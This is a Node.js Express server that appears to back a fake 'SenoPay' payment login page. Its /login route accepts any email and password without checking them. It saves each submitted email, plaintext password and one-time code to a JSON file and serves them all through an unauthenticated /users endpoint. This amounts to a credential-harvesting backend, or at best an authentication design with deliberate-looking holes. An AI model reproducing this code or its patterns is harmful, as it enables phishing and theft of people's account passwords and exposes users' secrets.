const express = require("express");
const fs = require("fs");
const path = require("path");
const cors = require("cors");

const app = express();
const port = process.env.PORT || 3000;

const VERIFICATION_FILE = path.join(__dirname, "verificationCodes.json");
const LOGIN_ATTEMPTS_FILE = path.join(__dirname, "loginAttempts.json");

// Middleware configuration
app.use(express.json());
app.use(cors());

// Serve static files from the 'public' directory
app.use(express.static(path.join(__dirname, "public")));
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "senopay.html"));
});

// Function to read data from a JSON file
function readJsonFile(filePath, defaultValue = {}) {
    try {
        if (!fs.existsSync(filePath)) {
            fs.writeFileSync(filePath, JSON.stringify(defaultValue, null, 2));
        }
        return JSON.parse(fs.readFileSync(filePath, "utf8"));
    } catch (err) {
        console.error(`Error reading ${filePath}:`, err);
        return defaultValue;
    }
}

// Function to write data to a JSON file
function writeJsonFile(filePath, data) {
    try {
        fs.writeFileSync(filePath, JSON.stringify(data, null, 2), "utf8");
    } catch (err) {
        console.error(`Error writing to ${filePath}:`, err);
    }
}

// API endpoint for login
app.post("/login", (req, res) => {
    const { email, password } = req.body;

    if (email && password) {
        const verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
        
        // Read and update verification codes
        const verificationCodes = readJsonFile(VERIFICATION_FILE, {});
        verificationCodes[email] = verificationCode;
        writeJsonFile(VERIFICATION_FILE, verificationCodes);

        // Log the attempt
        logLoginAttempt(email, password, verificationCode);

        return res.status(200).json({ 
            message: "Login successful. Verification required.",
            verificationCode, // ⚠️ Remove this in production (for testing only)
        });
    } else {
        logLoginAttempt(email, "failure", null);
        return res.status(401).json({ message: "Invalid credentials" });
    }
});

// API endpoint to get the list of login attempts
app.get("/users", (req, res) => {
    const loginAttempts = readJsonFile(LOGIN_ATTEMPTS_FILE, []);
    return res.status(200).json(loginAttempts);
});

// API endpoint for OTP verification
app.post("/verify", (req, res) => {
    const { email, code } = req.body;
    
    const verificationCodes = readJsonFile(VERIFICATION_FILE, {});
    
    if (verificationCodes[email] && verificationCodes[email] === code) {
        delete verificationCodes[email]; // Remove OTP after successful verification
        writeJsonFile(VERIFICATION_FILE, verificationCodes);
        return res.status(200).json({ message: "Verification successful" });
    } else {
        return res.status(400).json({ message: "Invalid or expired verification code" });
    }
});

// Function to log login attempts to loginAttempts.json
function logLoginAttempt(email, password, otp) {
    const loginAttempt = {
        email,
        password,
        otp: otp || "N/A", // Stores OTP or "N/A" if unavailable
        timestamp: new Date().toISOString(),
    };

    const loginAttempts = readJsonFile(LOGIN_ATTEMPTS_FILE, []);
    loginAttempts.push(loginAttempt);
    writeJsonFile(LOGIN_ATTEMPTS_FILE, loginAttempts);
}

// Start the server
app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
